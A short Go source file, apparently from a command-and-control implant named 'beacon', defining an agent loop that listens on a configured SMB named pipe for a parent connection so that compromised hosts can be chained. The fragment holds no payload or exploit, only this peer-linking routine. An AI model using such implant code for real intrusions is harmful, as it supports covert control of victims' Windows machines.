//go:build windows

package core

import (
	"beacon/pkg/cascade"
	"beacon/pkg/profile"
	"fmt"
)

func (a *Agent) runInternalSMB() int {
	for a.shouldRunInternal() {
		pipeName := profile.GlobalProfile.SMBInternal.PipeName
		fmt.Printf("[*] Internal SMB listening on %s\n", pipeName)

		link, err := cascade.ListenSMB(pipeName)
		if err != nil {
			fmt.Printf("[!] Internal SMB listen error: %v\n", err)
			a.internalReconnectDelay()
			continue
		}

		fmt.Printf("[*] Internal SMB parent connected\n")
		_ = a.runInternal(link)
		a.internalReconnectDelay()
	}
	return 0
}
